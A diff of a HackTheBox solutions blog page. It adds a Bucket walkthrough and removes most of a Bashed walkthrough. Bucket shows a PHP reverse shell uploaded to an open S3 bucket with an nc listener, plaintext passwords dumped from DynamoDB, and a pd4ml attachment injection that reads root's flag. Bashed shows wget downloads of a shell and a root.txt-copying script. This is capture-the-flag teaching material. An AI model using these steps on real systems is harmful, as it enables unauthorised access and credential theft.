@@ -59,107 +59,377 @@
 
 
             <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/htb-bucket.html" class="uk-article-title uk-link-muted" itemprop="name">HTB: Bucket</a>
+                <p class="uk-article-meta"><time datetime="2021-06-27" itemprop="datePublished">nie 27 czerwca 2021</time> • <a href="/category/hackthebox.html">HackTheBox</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Solution to the Bucket VM</p>
+                <section itemprop="articleBody"><h1>Foothold</h1>
+<p>First, as always we scan ports with <em>nmap</em>.</p>
+<div class="highlight"><pre><span></span>nmap -sS -sV  <span class="m">10</span>.10.10.212  
+Starting Nmap <span class="m">7</span>.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2021</span>-05-16 <span class="m">23</span>:27 CEST
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.212
+Host is up <span class="o">(</span><span class="m">0</span>.038s latency<span class="o">)</span>.
+Not shown: <span class="m">998</span> closed ports
+PORT   STATE SERVICE VERSION
+<span class="m">22</span>/tcp open  ssh     OpenSSH <span class="m">8</span>.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol <span class="m">2</span>.0<span class="o">)</span>
+<span class="m">80</span>/tcp open  http    Apache httpd <span class="m">2</span>.4.41
+Service Info: Host: <span class="m">127</span>.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">8</span>.03 seconds
+</pre></div>
+
+
+<p>There is something on port 80, so lets check:</p>
+<div class="highlight"><pre><span></span>curl <span class="m">10</span>.10.10.212
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>302 Found<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Found<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>The document has moved <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://bucket.htb/&quot;</span><span class="p">&gt;</span>here<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">address</span><span class="p">&gt;</span>Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80<span class="p">&lt;/</span><span class="nt">address</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<p>So we have to map this host name with the ip address:</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s2">&quot;10.10.10.212 bucket.htb&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</pre></div>
+
+
+<p>Now it start to work, but while looking through source code of recived page, we can see images urls, that are not opened correcly, like: http://s3.bucket.htb/adserver/images/bug.jpg</p>
+<p>So we can add another line to our <strong>hosts</strong> file</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s2">&quot;10.10.10.212 s3.bucket.htb&quot;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</pre></div>
+
+
+<p>Great, the page is looking good right now. But the interesting part is the <strong>s3</strong> suffix, as it sounds like a local instance of the famous Amazon Simple Storage Service. And the title of this machine confirms out assumption! So... let's have some fun with it.</p>
+<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/adserver/images/&quot;</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="nt">&lt;Error&gt;</span>
+    <span class="nt">&lt;Code&gt;</span>NoSuchKey<span class="nt">&lt;/Code&gt;</span>
+    <span class="nt">&lt;Message&gt;</span>The specified key does not exist.<span class="nt">&lt;/Message&gt;</span>
+
+    <span class="nt">&lt;RequestID&gt;</span>7a62c49f-347e-4fc4-9331-6e8eEXAMPLE<span class="nt">&lt;/RequestID&gt;</span>
+<span class="nt">&lt;/Error&gt;</span>┌─[pawel@parrot]─[~]
+</pre></div>
+
+
+<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/adserver/&quot;</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span>curl <span class="s2">&quot;http://s3.bucket.htb/&quot;</span>
+<span class="sb">```</span>json
+<span class="sb">```</span><span class="o">{</span><span class="s2">&quot;status&quot;</span>: <span class="s2">&quot;running&quot;</span><span class="o">}</span>
+</pre></div>
+
+
+<p>We can see different responses, so it looks promissing!</p>
+<p>As it look like a s3 instance, we can try to use it like it, either by working with pure requests:</p>
+<div class="highlight"><pre><span></span>curl -X PUT http://s3.bucket.htb/adserver/ -T reverse-shell.php
+</pre></div>
+
+
+<p>That looks like a pure luck, but it is really working... But we can try something more. Why not use some FUZZ?</p>
+<div class="highlight"><pre><span></span>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc <span class="m">404</span> http://s3.bucket.htb/FUZZ/foo/
+</pre></div>
+
+
+<p>And hey, what we have here!?</p>
+<div class="highlight"><pre><span></span>=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                   
+=====================================================================
+
+
+000001688:   500        0 L      13 W       158 Ch      &quot;shell&quot;                                                                                   
+</pre></div>
+
+
+<p><img alt="39fbf0566c187f6e594f2c457cc0a0c9.png" src="../_resources/e578d9f200b54f42b2bd40f213fb932b.png"></p>
+<p>We are definitly going somewhere. For now just note that discovery.</p>
+<p>For now we can try last, but most important thing: use the <strong>aws</strong> cli. It is already on your system or just install it from system repo.</p>
+<p>Now the param <strong>--endpoint-url</strong> will be crucial. Lets try:</p>
+<div class="highlight"><pre><span></span>aws --endpoint-url=http://s3.bucket.htb s3 ls adserver/
+</pre></div>
+
+
+<p>Nope, one more step is missing:</p>
+<div class="highlight"><pre><span></span>aws configure
+</pre></div>
+
+
+<p>But we don't have any legit credentials. What can we do? Oh, well, just type anything in there. Any random stuff. And it works, jeeez!</p>
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 ls adserver/
+                           PRE images/
+<span class="m">2021</span>-06-26 <span class="m">23</span>:58:04       <span class="m">5344</span> index.html
+</pre></div>
+
+
+<p>So prepare your pretty php reverse shell and copy it on the server, hoping it will work.</p>
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver/
+</pre></div>
+
+
+<p>Now we can try to execute it:</p>
+<div class="highlight"><pre><span></span>nc -lvnp <span class="m">4321</span> <span class="c1"># in one term</span>
+<span class="c1"># next that below in another:</span>
+curl http://bucket.htb/php-reverse-shell.php
+<span class="c1"># BOOM, we got the foothold</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4321</span> ...
+connect to <span class="o">[</span><span class="m">10</span>.10.14.11<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span><span class="m">10</span>.10.10.212<span class="o">]</span> <span class="m">54924</span>
+Linux bucket <span class="m">5</span>.4.0-48-generic <span class="c1">#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+ <span class="m">22</span>:03:15 up  <span class="m">3</span>:08,  <span class="m">1</span> user,  load average: <span class="m">0</span>.01, <span class="m">0</span>.20, <span class="m">0</span>.25
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+roy      pts/1    <span class="m">10</span>.10.14.11      <span class="m">18</span>:59   <span class="m">56</span>.00s  <span class="m">0</span>.44s  <span class="m">0</span>.44s -bash
+<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: <span class="m">0</span>: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+$ 
+</pre></div>
+
+
+<p>We are inside!</p>
+<h1>User</h1>
+<p>Escalating privileges in this case is quite simple, but we have to combine something new to find, with some foothold info. And with some luck, if it was a real life scenario.</p>
+<p>Of course it is recomended to start some enumaration scripts in this moment. Like <em>LinEnum</em> or <em>linpeas</em> and I encourage you to do it. But lets jump straight to the solution.</p>
+<div class="highlight"><pre><span></span>$ <span class="nb">cd</span> /home
+$ ls
+roy
+$ <span class="nb">cd</span> roy
+$ ls
+project
+user.txt
+$ cat user.txt
+cat: user.txt: Permission denied
+</pre></div>
+
+
+<p>That give us at least the user name: <em>roy</em>. Great, but what about the password. Lets step back, to the foothold. We know about the dynamodb service, and we probably have access to id. Why not try to dive in it?</p>
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb list-tables
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="p">{</span>
+    <span class="nt">&quot;TableNames&quot;</span><span class="p">:</span> <span class="p">[</span>
+        <span class="s2">&quot;users&quot;</span>
+    <span class="p">]</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb scan --table-name users
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="p">{</span>
+    <span class="nt">&quot;Items&quot;</span><span class="p">:</span> <span class="p">[</span>
+        <span class="p">{</span>
+            <span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Management@#1@#&quot;</span>
+            <span class="p">},</span>
+            <span class="nt">&quot;username&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Mgmt&quot;</span>
+            <span class="p">}</span>
+        <span class="p">},</span>
+        <span class="p">{</span>
+            <span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Welcome123!&quot;</span>
+            <span class="p">},</span>
+            <span class="nt">&quot;username&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Cloudadm&quot;</span>
+            <span class="p">}</span>
+        <span class="p">},</span>
+        <span class="p">{</span>
+            <span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;n2vM-&lt;_K_Q:.Aa2&quot;</span>
+            <span class="p">},</span>
+            <span class="nt">&quot;username&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="nt">&quot;S&quot;</span><span class="p">:</span> <span class="s2">&quot;Sysadm&quot;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">],</span>
+    <span class="nt">&quot;Count&quot;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+    <span class="nt">&quot;ScannedCount&quot;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+    <span class="nt">&quot;ConsumedCapacity&quot;</span><span class="p">:</span> <span class="kc">null</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>We have found three passwords to try. And guess what: we can use the third one to log in through <em>ssh</em> to <em>roy's</em> account!</p>
+<div class="highlight"><pre><span></span>ssh roy@10.10.10.212
+Welcome to Ubuntu <span class="m">20</span>.04 LTS <span class="o">(</span>GNU/Linux <span class="m">5</span>.4.0-48-generic x86_64<span class="o">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun <span class="m">27</span> Jun <span class="m">2021</span> <span class="m">09</span>:44:22 AM UTC
+
+  System load:                      <span class="m">0</span>.0
+  Usage of /:                       <span class="m">33</span>.8% of <span class="m">17</span>.59GB
+  Memory usage:                     <span class="m">22</span>%
+  Swap usage:                       <span class="m">0</span>%
+  Processes:                        <span class="m">239</span>
+  Users logged in:                  <span class="m">0</span>
+  IPv4 address <span class="k">for</span> br-bee97070fb20: <span class="m">172</span>.18.0.1
+  IPv4 address <span class="k">for</span> docker0:         <span class="m">172</span>.17.0.1
+  IPv4 address <span class="k">for</span> ens160:          <span class="m">10</span>.10.10.212
+  IPv6 address <span class="k">for</span> ens160:          dead:beef::250:56ff:feb9:c8be
+
+
+<span class="m">229</span> updates can be installed immediately.
+<span class="m">103</span> of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check <span class="k">for</span> new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Jun <span class="m">26</span> <span class="m">18</span>:59:31 <span class="m">2021</span> from <span class="m">10</span>.10.14.11
+roy@bucket:~$ ls
+project  user.txt
+roy@bucket:~$ cat user.txt 
+1845bbd4c30469474a3f5d2be1a32922
+</pre></div>
+
+
+<p>As we have the user flag, lets jump into the final part.</p>
+<h1>Root</h1>
+<div class="highlight"><pre><span></span>roy@bucket:~$ <span class="nb">cd</span> /var/www/
+roy@bucket:/var/www$ ls -l
+total <span class="m">8</span>
+drwxr-x---+ <span class="m">4</span> root root <span class="m">4096</span> Feb <span class="m">10</span> <span class="m">12</span>:29 bucket-app
+drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Jun <span class="m">27</span> <span class="m">09</span>:46 html
+roy@bucket:/var/www$ <span class="nb">cd</span> bucket-app/
+roy@bucket:/var/www/bucket-app$ ls
+composer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor
+roy@bucket:/var/www/bucket-app$ head -n <span class="m">30</span> index.php 
+&lt;?php
+require <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>
+use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<span class="p">;</span>
+<span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="o">]===</span><span class="s2">&quot;POST&quot;</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span><span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;action&quot;</span><span class="o">]===</span><span class="s2">&quot;get_alerts&quot;</span><span class="o">)</span> <span class="o">{</span>
+                date_default_timezone_set<span class="o">(</span><span class="s1">&#39;America/New_York&#39;</span><span class="o">)</span><span class="p">;</span>
+                <span class="nv">$client</span> <span class="o">=</span> new DynamoDbClient<span class="o">([</span>
+                        <span class="s1">&#39;profile&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;default&#39;</span>,
+                        <span class="s1">&#39;region&#39;</span>  <span class="o">=</span>&gt; <span class="s1">&#39;us-east-1&#39;</span>,
+                        <span class="s1">&#39;version&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;latest&#39;</span>,
+                        <span class="s1">&#39;endpoint&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;http://localhost:4566&#39;</span>
+                <span class="o">])</span><span class="p">;</span>
+
+                <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span>-&gt;getIterator<span class="o">(</span><span class="s1">&#39;Scan&#39;</span>, array<span class="o">(</span>
+                        <span class="s1">&#39;TableName&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;alerts&#39;</span>,
+                        <span class="s1">&#39;FilterExpression&#39;</span> <span class="o">=</span>&gt; <span class="s2">&quot;title = :title&quot;</span>,
+                        <span class="s1">&#39;ExpressionAttributeValues&#39;</span> <span class="o">=</span>&gt; array<span class="o">(</span><span class="s2">&quot;:title&quot;</span><span class="o">=</span>&gt;array<span class="o">(</span><span class="s2">&quot;S&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;Ransomware&quot;</span><span class="o">))</span>,
+                <span class="o">))</span><span class="p">;</span>
+
+                foreach <span class="o">(</span><span class="nv">$iterator</span> as <span class="nv">$item</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="nv">$name</span><span class="o">=</span>rand<span class="o">(</span><span class="m">1</span>,10000<span class="o">)</span>.<span class="s1">&#39;.html&#39;</span><span class="p">;</span>
+                        file_put_contents<span class="o">(</span><span class="s1">&#39;files/&#39;</span>.<span class="nv">$name</span>,<span class="nv">$item</span><span class="o">[</span><span class="s2">&quot;data&quot;</span><span class="o">])</span><span class="p">;</span>
+                <span class="o">}</span>
+                passthru<span class="o">(</span><span class="s2">&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf&quot;</span><span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+<span class="o">}</span>
+<span class="k">else</span>
+<span class="o">{</span>
+?&gt;
+</pre></div>
+
+
+<p>Looks promissing, but will it be enough? To escalate to root we need to take controll over a process running with root privileges. We will take a look at the apache config:</p>
+<div class="highlight"><pre><span></span>roy@bucket:/var/www/bucket-app$ head /etc/apache2/sites-available/000-default.conf 
+&lt;VirtualHost <span class="m">127</span>.0.0.1:8000&gt;
+        &lt;IfModule mpm_itk_module&gt;
+                AssignUserId root root
+        &lt;/IfModule&gt;
+        DocumentRoot /var/www/bucket-app
+&lt;/VirtualHost&gt;
+</pre></div>
+
+
+<p>God bless the man who did it. And forbid him.</p>
+<p>Now we need to read carefully what we have above in the <strong>index.php</strong> file.</p>
+<p>There is a script, that is executed by a certain request from the vulnerable machine:</p>
+<div class="highlight"><pre><span></span>curl -X POST -F <span class="s1">&#39;action=get_alerts&#39;</span> http://127.0.0.1:8000 <span class="p">;</span> rm /tmp/hack/* <span class="p">;</span> cp * /tmp/unc
+</pre></div>
+
+
+<p>But to do anything we have to insert something to <em>alerts</em> table in dynamodb with the title of <em>Ransomware</em>. We have seen before, that there is no such table as <em>alerts</em>, so we have first to create it:</p>
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span><span class="m">5</span>,WriteCapacityUnits<span class="o">=</span><span class="m">5</span>
+</pre></div>
+
+
+<p>then we will be able to inject out exploit:</p>
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;EXPLOIT PLACEHOLDER&quot;} } &#39;</span>
+</pre></div>
+
+
+<p>But wait, do we have one? Sure, take a look at the line: </p>
+<div class="highlight"><pre><span></span><span class="x">passthru(&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.</span>
+</pre></div>
+
+
+<p>it is our key to the kingdom. Google <em>pd4ml vulnerabilities</em> to find this awesome article: https://infosecwriteups.com/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd about <em>pd4ml:attachment</em> tag, that we can use here. </p>
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&lt;html&gt; &lt;pd4ml:attachment src=file:///root/root.txt description=test&gt;&lt;/pd4ml:attachment&gt;&lt;/html&gt;&quot;} } &#39;</span>
+</pre></div>
+
+
+<p>Finding a perfect syntax to send to the db is a bit of a pain. The <em>description</em> attribute seems to be mandatory, but -- thanks God -- brackets around the arguments values aren't, which makes it a bit easier to read, cause we don't need to escape it.</p>
+<p>There is one more problem. There is a cront task, that is clearing the database and the <em>/var/www/bucket-app/files</em> directory every few minutes. So we have to be fast. Or smart. Fast and smart.</p>
+<p>We have to execute this oneliner on our machine:</p>
+<div class="highlight"><pre><span></span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span><span class="m">5</span>,WriteCapacityUnits<span class="o">=</span><span class="m">5</span><span class="p">;</span>aws --endpoint-url<span class="o">=</span>http://s3.bucket.htb dynamodb put-item --table-name alerts --item <span class="s1">&#39; { &quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&lt;html&gt; &lt;pd4ml:attachment src=file:///root/root.txt description=test&gt;&lt;/pd4ml:attachment&gt;&lt;/html&gt;&quot;} } &#39;</span>
+</pre></div>
+
+
+<p>and after that this one on the vulnerable one:</p>
+<div class="highlight"><pre><span></span>curl -X POST -F <span class="s1">&#39;action=get_alerts&#39;</span> http://127.0.0.1:8000 <span class="p">;</span> rm -r /tmp/hack <span class="p">;</span> mkdir -p /tmp/hack <span class="p">;</span> cp /var/www/bucket-app/files/* /tmp/hack <span class="p">;</span> cat /tmp/hack/result.pdf
+</pre></div>
+
+
+<p>Thats the speed of light, babe! Inside the pdf content we can see this part:</p>
+<div class="highlight"><pre><span></span>/Type /EmbeddedFile
+/Length 33
+/Params 5 0 R
+&gt;&gt;
+stream
+3ba97200d588ae0d517c117a03396f10
+endstream
+endobj
+7 0 obj
+&lt;&lt;
+/Type /Filespec
+/F (root.txt)
+</pre></div>
+
+
+<p>Yay! See the root flag in the middle?</p></section>
+                <a href="/htb-bucket.html#disqus_thread"></a>
+                <hr class="uk-article-divider">
+            </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
                 <a href="/bashed.html" class="uk-article-title uk-link-muted" itemprop="name">Bashed</a>
                 <p class="uk-article-meta"><time datetime="2020-01-13" itemprop="datePublished">pon 13 stycznia 2020</time> • <a href="/category/hackthebox.html">HackTheBox</a></p>
 </p>
                 <p class="uk-article-lead" itemprop="description">Solution to the Bashed VM</p>
-                <section itemprop="articleBody"><h1>User flag</h1>
-<p>It is not really necessary to start this one with <strong>nmap</strong>, but it's never a bad first step</p>
-<div class="highlight"><pre><span></span>root@kali:~# nmap -sS -Pn -sV <span class="m">10</span>.10.10.68
-</pre></div>
-
-
-<div class="highlight"><pre><span></span>Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET
-Nmap scan report for 10.10.10.68
-Host is up (0.11s latency).
-Not shown: 999 closed ports
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
-</pre></div>
-
-
-<p>As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a <strong>phpbash</strong> project. That's nice, but we want to speed things up.</p>
-<p>We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuster.
-It takes him a few minutes to find the thing we need:</p>
-<div class="highlight"><pre><span></span>http://10.10.10.68/dev/phpbash.php
-</pre></div>
-
-
-<p>After opening that link we know that we are in the right place. It's an online bash terminal. So wy not to try to look for the first flag?</p>
-<div class="highlight"><pre><span></span>$ ls /user
-$ cat /home/arrexel/user.txt
-</pre></div>
-
-
-<p>Yup, we got it!</p>
-<h1>Root flag</h1>
-<p><em>phpbash</em> is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.</p>
-<p>Firstly we need a place in the /var/www/html path to store it. Only the <strong>upload</strong> dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:</p>
-<div class="highlight"><pre><span></span>www-data:/var/www/html/uploads# wget <span class="m">10</span>.10.14.16/shell.php
-</pre></div>
-
-
-<p>Now I can open netcat on my Kali, and load 10.10.10.68/upload/shell.php in my web browser.</p>
-<div class="highlight"><pre><span></span>root@kali:/var/www/html# nc -v -n -l -p <span class="m">1234</span>
-</pre></div>
-
-
-<p>It works, so now the same thing in <em>/tmp</em> dir <em>LinEnum</em></p>
-<div class="highlight"><pre><span></span><span class="nb">cd</span> /tmp
-wget <span class="m">10</span>.10.14.16/LinEnum.sh
-bash ./LinEnum.sh
-</pre></div>
-
-
-<p>We can see good stuff in it's output!</p>
-<div class="highlight"><pre><span></span>[+] We can sudo without supplying a password!
-Matching Defaults entries for www-data on bashed:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on bashed:
-    (scriptmanager : scriptmanager) NOPASSWD: ALL
-</pre></div>
-
-
-<p>We knew about this user already from listing the home directory. Now we can sudo it.</p>
-<div class="highlight"><pre><span></span>$ sudo -u scriptmanager bash
-</pre></div>
-
-
-<p>Works. What next? We need something to find a point for privilege escalation. <strong>pspy</strong> will help us with it.</p>
-<div class="highlight"><pre><span></span>./pspy64
-</pre></div>
-
-
-<div class="highlight"><pre><span></span><span class="nt">2020</span><span class="o">/</span><span class="nt">01</span><span class="o">/</span><span class="nt">13</span> <span class="nt">05</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">01</span> <span class="nt">CMD</span><span class="o">:</span> <span class="nt">UID</span><span class="o">=</span><span class="nt">0</span>    <span class="nt">PID</span><span class="o">=</span><span class="nt">2297</span>   <span class="o">|</span> <span class="nt">python</span> <span class="nt">test</span><span class="p">.</span><span class="nc">py</span>
-<span class="nt">2020</span><span class="o">/</span><span class="nt">01</span><span class="o">/</span><span class="nt">13</span> <span class="nt">05</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">01</span> <span class="nt">CMD</span><span class="o">:</span> <span class="nt">UID</span><span class="o">=</span><span class="nt">0</span>    <span class="nt">PID</span><span class="o">=</span><span class="nt">2296</span>   <span class="o">|</span> <span class="o">/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sh</span> <span class="nt">-c</span> <span class="nt">cd</span> <span class="o">/</span><span class="nt">scripts</span><span class="o">;</span> <span class="nt">for</span> <span class="nt">f</span> <span class="nt">in</span> <span class="o">*</span><span class="p">.</span><span class="nc">py</span><span class="o">;</span> <span class="nt">do</span> <span class="nt">python</span> <span class="s2">&quot;$f&quot;</span><span class="o">;</span> <span class="nt">done</span>
-</pre></div>
-
-
-<p>Nice, we can see, that <strong>/scrips</strong> dir is owned by <strong>scriptmanager</strong>!</p>
-<p>Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">shutil</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="s2">&quot;/root/root.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;/tmp/root.txt&quot;</span><span class="p">)</span>
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chmod 777 /tmp/root.txt&quot;</span><span class="p">)</span>
-</pre></div>
-
-
-<p>As in every step, I've served it on my Kali apache, so:</p>
-<div class="highlight"><pre><span></span>$ wget <span class="m">10</span>.10.14.16/bashed/run.py
-
-sudo -u scriptmanager cp run.py /scripts
-$ cat /tmp/root.txt
-</pre></div>
-
-
-<p>IT'S ROOTED. It was not difficult but fun!</p></section>
-                <a href="/bashed.html#disqus_thread"></a>
